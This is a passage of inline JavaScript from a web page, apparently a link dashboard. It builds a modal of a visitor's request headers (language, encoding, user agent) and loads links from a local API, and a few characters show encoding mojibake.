    ${row('Accept-Language', c.acceptLanguage, 'dim')}
    ${row('Accept-Encoding', c.acceptEncoding, 'dim')}
    ${rowFull('User-Agent', c.userAgent)}
  `);

  $('modalBody').innerHTML = html;
  $('modalOverlay').classList.add('open');
}

function section(title, content) {
  return `<div class="info-section"><div class="section-title">${title}</div><div class="info-grid">${content}</div></div>`;
}
function row(k, v, cls='') {
  return `<div class="irow"><div class="ikey">${k}</div><div class="ival ${cls}">${esc(v)||'‚Äî'}</div></div>`;
}
function rowFull(k, v, cls='') {
  return `<div class="irow full"><div class="ikey">${k}</div><div class="ival ${cls}">${esc(v)||'‚Äî'}</div></div>`;
}

function closeModalClick(e) { if (e.target === $('modalOverlay')) closeModal(); }
function closeModal() { $('modalOverlay').classList.remove('open'); }
document.addEventListener('keydown', e => { if (e.key==='Escape') closeModal(); });

// ‚îÄ‚îÄ Init
(async () => {
  try {
    const r = await fetch('/api/links');
    const data = await r.json();
    data.forEach(l => links[l.id] = l);
    renderSidebar();
  } catch(e) {}
})();
</script>
</body>
</html>
